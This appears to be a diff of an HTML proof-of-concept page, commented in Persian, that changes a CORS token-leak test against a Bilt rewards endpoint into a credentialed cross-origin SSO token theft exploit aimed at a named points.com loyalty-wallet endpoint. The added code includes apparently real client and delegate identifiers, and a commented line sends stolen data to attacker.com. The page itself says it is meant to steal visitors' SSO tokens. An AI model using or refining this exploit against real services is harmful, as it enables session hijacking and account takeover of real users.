@@ -1,39 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit Test - Bilt Rewards</title>
+    <title>CORS Exploit - Points.com SSO Token Leak</title>
 </head>
 <body>
-    <h1>CORS Token Leakage Test</h1>
-    <div id="result">در حال تلاش برای دریافت توکن...</div>
+    <h1>Points.com SSO Token Theft PoC</h1>
+    <p>این اسکریپت تلاش می‌کند توکن SSO شما را از points.com سرقت کند.</p>
+    <div id="output" style="background: #f0f0f0; padding: 10px; border: 1px solid #ccc;">
+        در انتظار دریافت پاسخ...
+    </div>
 
     <script>
-        const targetUrl = "https://www.bilt.com/api/id/public/user/authentication/token";
-
-        // ایجاد درخواست با استفاده از XMLHttpRequest برای بررسی دقیق‌تر هدرها
-        var xhr = new XMLHttpRequest();
+        const url = "https://bilt-loyaltywallet.points.com/auth/blw/sso";
         
-        xhr.open("GET", targetUrl, true);
-        
-        // ارسال کوکی‌ها و اطلاعات احراز هویت (بسیار مهم برای حمله CORS)
-        xhr.withCredentials = true;
+        // داده‌هایی که در درخواست اصلی فرستاده می‌شد
+        const data = JSON.stringify({
+            "token": "https://lcp.points.com/v1/lps/e4705cc7-173e-4d04-9378-20d0317888f1/mv-delegates/71a4023e-a3d1-4421-aa6f-a995ab8e2d3b",
+            "clientId": "1e53ce2f-22d9-4852-a323-52dc5c9baa33"
+        });
 
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4) {
-                if (xhr.status == 200) {
-                    // اگر پاسخ با موفقیت دریافت شود، توکن نشت پیدا کرده است
-                    document.getElementById("result").innerHTML = 
-                        "<h3>Success! Token Leaked:</h3><pre>" + xhr.responseText + "</pre>";
-                    console.log("Leaked Data:", xhr.responseText);
+        async function exploit() {
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    mode: "cors",
+                    credentials: "include", // ارسال کوکی‌ها (cf_clearance, __cf_bm, ...)
+                    headers: {
+                        "Content-Type": "text/plain;charset=UTF-8",
+                        // نکته: هدر Authorization معمولاً توسط مرورگر در درخواست Cross-Origin 
+                        // بدون تایید Preflight مسدود می‌شود. 
+                        // اما اگر سرور آن را در لیست Allowed Headers قرار داده باشد، نشت رخ می‌دهد.
+                        "Authorization": "Bearer YOUR_ACCESS_TOKEN_HERE" 
+                    },
+                    body: data
+                });
+
+                if (response.ok) {
+                    const json = await response.json();
+                    document.getElementById("output").innerHTML = 
+                        "<h3>Success! SSO AccessToken Leaked:</h3><pre>" + 
+                        JSON.stringify(json, null, 2) + "</pre>";
+                    
+                    // در دنیای واقعی، اتکر این داده را به سرور خودش می‌فرستد:
+                    // fetch("https://attacker.com/log?data=" + btoa(JSON.stringify(json)));
                 } else {
-                    document.getElementById("result").innerHTML = 
-                        "خطا در دریافت پاسخ. وضعیت: " + xhr.status + 
-                        "<br>احتمالاً CORS به درستی پیکربندی شده یا شما لاگین نیستید.";
+                    document.getElementById("output").innerText = 
+                        "خطا: سرور درخواست را نپذیرفت (Status: " + response.status + ")";
                 }
+            } catch (err) {
+                document.getElementById("output").innerText = 
+                    "خطای CORS: دسترسی مسدود شد. سرور اجازه رید از این اوریجین را نمی‌دهد.";
+                console.error("CORS Blocked:", err);
             }
-        };
+        }
 
-        xhr.send();
+        exploit();
     </script>
 </body>
 </html>
